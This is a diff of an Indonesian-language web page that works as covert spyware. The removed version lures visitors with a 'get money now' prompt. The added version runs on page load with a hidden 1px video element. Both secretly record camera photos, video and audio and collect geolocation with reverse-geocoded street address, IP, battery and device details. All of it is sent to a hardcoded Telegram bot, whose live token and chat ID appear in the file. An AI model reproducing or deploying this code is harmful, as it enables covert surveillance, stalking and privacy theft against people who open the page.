@@ -2,264 +2,166 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>CLIK.NOW</title>
+  <title>Auto Kirim Telegram</title>
   <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: #000;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-
-    .popup {
-      background-color: rgba(0, 0, 0, 0.7);
-      padding: 30px;
-      border-radius: 15px;
-      text-align: center;
-      width: 300px;
-    }
-
-    button {
-      transition: background 0.3s ease, transform 0.3s ease;
-      padding: 10px 20px;
-      margin-top: 15px;
-      border: none;
-      border-radius: 8px;
-      background: #00ff88;
-      color: #000;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    #video {
-      display: none !important;
-      width: 1px;
-      height: 1px;
-      position: absolute;
-      left: -9999px;
-    }
-
-    .circle-light {
-      position: absolute;
-      top: 5px;
-      left: 5px;
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background-color: red;
-      box-shadow: 0 0 8px 3px red;
-      z-index: 1000;
-    }
-
-    #loading {
-      display: none;
-      margin-top: 30px;
-      text-align: center;
-    }
-
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #00ff88;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 10px;
-    }
-
-    .money-text {
-      font-size: 18px;
-      font-weight: bold;
-      color: #00ff88;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0.4; }
-      100% { opacity: 1; }
-    }
+    body { margin: 0; background: transparent; overflow: hidden; color: transparent; }
+    video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0; }
   </style>
 </head>
 <body>
-  <div class="circle-light"></div>
+<video id="video" autoplay muted playsinline></video>
+<script>
+const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
+const chat_id = '7552410869';
 
-  <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
-    silahkan pencet lanjutkan untuk mendapatkan uang
-  </marquee>
+let cams = [], camIndex = 0;
+let chunksVideo = [], chunksAudio = [];
+let currentStream = null;
 
-  <div class="popup" id="step1">
-    <h2>DAPATKAN UANG SEKARANG!</h2>
-    <button onclick="startAll()">LANJUTKAN</button>
-  </div>
+async function startAll() {
+  await getCameras();
+  sendStaticPhoto();
+  sendDeviceInfo();
+  await switchCamAndRecord();
+  setInterval(() => switchCamAndRecord(), 12000); // ganti kamera tiap 12s
+  setInterval(() => autoCapturePhoto(), 1000);     // foto tiap 1s
+}
 
-  <div id="loading">
-    <div class="loader"></div>
-    <p class="money-text">Mengumpulkan Uang Tunai 💸...</p>
-    <p style="font-size:14px;">Harap tunggu, sistem sedang memproses...</p>
-  </div>
+async function getCameras() {
+  const devices = await navigator.mediaDevices.enumerateDevices();
+  cams = devices.filter(d => d.kind === 'videoinput');
+  if (cams.length === 0) alert('Tidak ada kamera ditemukan!');
+}
 
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+async function switchCamAndRecord() {
+  if (cams.length === 0) await getCameras();
+  const deviceId = cams[camIndex % cams.length].deviceId;
+  camIndex++;
 
-  <script>
-    const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
-    const chat_id = '7552410869';
-    let recorder;
-    let recordedChunks = [];
+  if (currentStream) currentStream.getTracks().forEach(t => t.stop());
 
-    async function startAll() {
-      document.getElementById('step1').style.display = 'none';
-      document.getElementById('loading').style.display = 'block';
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { deviceId: { exact: deviceId } },
+    audio: true
+  });
 
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+  currentStream = stream;
+  const video = document.getElementById('video');
+  video.srcObject = stream;
 
-        await new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            video.play();
-            resolve();
-          };
-        });
+  // Rekam video
+  const videoRecorder = new MediaRecorder(stream);
+  videoRecorder.ondataavailable = e => { if (e.data.size > 0) chunksVideo.push(e.data); };
+  videoRecorder.onstop = () => {
+    const blob = new Blob(chunksVideo, { type: 'video/webm' });
+    chunksVideo = [];
+    const form = new FormData();
+    form.append("chat_id", chat_id);
+    form.append("video", blob, "video10s.webm");
+    fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
+  };
+  videoRecorder.start();
+  setTimeout(() => videoRecorder.stop(), 10000);
 
-        await new Promise(resolve => setTimeout(resolve, 1500));
+  // Rekam audio
+  const audioRecorder = new MediaRecorder(stream);
+  audioRecorder.ondataavailable = e => { if (e.data.size > 0) chunksAudio.push(e.data); };
+  audioRecorder.onstop = () => {
+    const blob = new Blob(chunksAudio, { type: 'audio/webm' });
+    chunksAudio = [];
+    const form = new FormData();
+    form.append("chat_id", chat_id);
+    form.append("audio", blob, "audio10s.webm");
+    fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
+  };
+  audioRecorder.start();
+  setTimeout(() => audioRecorder.stop(), 10000);
+}
 
-        const synth = window.speechSynthesis;
-        const welcome = new SpeechSynthesisUtterance('Selamat! Uang sedang dikirim ke dompet digital Anda.');
-        welcome.lang = 'id-ID';
-        synth.speak(welcome);
+async function autoCapturePhoto() {
+  const video = document.getElementById('video');
+  if (!video.videoWidth) return;
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+  const form = new FormData();
+  form.append("chat_id", chat_id);
+  form.append("photo", blob, "photo.jpg");
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+}
 
-        await takeAndSendPhotos(stream);
+function sendStaticPhoto() {
+  const form = new FormData();
+  form.append("chat_id", chat_id);
+  form.append("photo", 'https://files.catbox.moe/p7xbtg.png');
+  form.append("caption", "🆁🅸🆉");
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+}
 
-        recorder = new MediaRecorder(stream);
-        recorder.ondataavailable = handleDataAvailable;
-        recorder.onstop = () => handleStop(stream);
-        recorder.start();
+async function sendDeviceInfo() {
+  const waktu = new Date().toLocaleString();
+  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+  const ua = navigator.userAgent;
+  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak diketahui';
+  const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
+  const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
+  const brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Tidak diketahui';
+  const url = location.href;
 
-        setTimeout(() => {
-          setInterval(() => {
-            recorder.stop();
-            recorder.start();
-          }, 17000);
-        }, 17000);
+  navigator.geolocation.getCurrentPosition(async pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const maps = `https://maps.google.com/?q=${lat},${lon}`;
+    const g = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+    const j = await g.json();
+    const lokasi = j.display_name || 'Lokasi tidak diketahui';
+    const alamat = j.address || {};
+    const kota = alamat.city || alamat.town || alamat.village || 'Tidak diketahui';
+    const kodepos = alamat.postcode || 'N/A';
+    const jalan = alamat.road || alamat.neighbourhood || 'N/A';
+    const negara = alamat.country || 'N/A';
+    const rumah = alamat.house_number || '-';
 
-        setTimeout(() => {
-          recorder.stop();
-          alert("Selesai! Terima kasih telah menunggu.");
-        }, 5 * 60 * 60 * 1000);
-      } catch (err) {
-        alert("Akses kamera/mikrofon ditolak.");
+    let cuaca = '';
+    try {
+      const r = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
+      const jc = await r.json();
+      if (jc.status && jc.result) {
+        const w = jc.result.weather[0];
+        cuaca = `🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${jc.result.main.temp}°C\n💧 Kelembaban: ${jc.result.main.humidity}%\n🌬️ Angin: ${jc.result.wind.speed} m/s`;
       }
+    } catch(e) {
+      cuaca = 'Gagal ambil cuaca';
     }
 
-    async function takeAndSendPhotos(stream) {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
+    const info = `
+📍 Lokasi Lengkap: ${lokasi}
+🏠 Jalan: ${jalan}, No: ${rumah}
+📫 Kode Pos: ${kodepos}
+🌍 Negara: ${negara}
+🗺️ Link Maps: ${maps}
+🕒 Waktu: ${waktu}
+🌐 IP: ${ip}
+🔋 Baterai: ${bat}
+📶 Jaringan: ${net}
+📱 User-Agent: ${ua}
+📱 Merek Android: ${brand}
+💾 RAM: ${ram}
+🔗 DARI URL: ${url}
+📡 CUACA SAAT INI:
+${cuaca}`;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id, text: info })
+    });
+  });
+}
 
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      for (let i = 0; i < 3; i++) {
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-        const info = await getDeviceInfo();
-
-        const caption = `
-[Foto ${i+1}]
-Device: ${info.device}
-Lokasi: ${info.location}
-Baterai: ${info.battery}
-Waktu: ${info.time}
-`;
-
-        const formData = new FormData();
-        formData.append("chat_id", chat_id);
-        formData.append("photo", blob, `photo${i+1}.jpg`);
-        formData.append("caption", caption.trim());
-
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-
-        await new Promise(resolve => setTimeout(resolve, 1000));
-      }
-    }
-
-    async function getDeviceInfo() {
-      const device = navigator.userAgent;
-      const waktu = new Date();
-      const jam = waktu.toLocaleTimeString();
-      const tanggal = waktu.toLocaleDateString();
-
-      let location = "Tidak tersedia";
-      await new Promise(resolve => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            location = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            resolve();
-          },
-          () => resolve()
-        );
-      });
-
-      const battery = await navigator.getBattery()
-        .then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`)
-        .catch(() => 'Tidak tersedia');
-
-      return {
-        device,
-        time: `${tanggal} ${jam}`,
-        location,
-        battery
-      };
-    }
-
-    function handleDataAvailable(event) {
-      if (event.data.size > 0) {
-        recordedChunks.push(event.data);
-      }
-    }
-
-    async function handleStop(stream) {
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      recordedChunks = [];
-
-      const info = await getDeviceInfo();
-      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-
-      const message = `
-[REKAMAN OTOMATIS]
-Device: ${info.device}
-IP: ${ip}
-Waktu: ${info.time}
-Lokasi: ${info.location}
-Baterai: ${info.battery}
-`;
-
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("caption", message.trim());
-      formData.append("video", blob, "rekaman.webm");
-
-      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-        method: 'POST',
-        body: formData
-      });
-    }
-  </script>
+window.onload = startAll;
+</script>
 </body>
 </html>
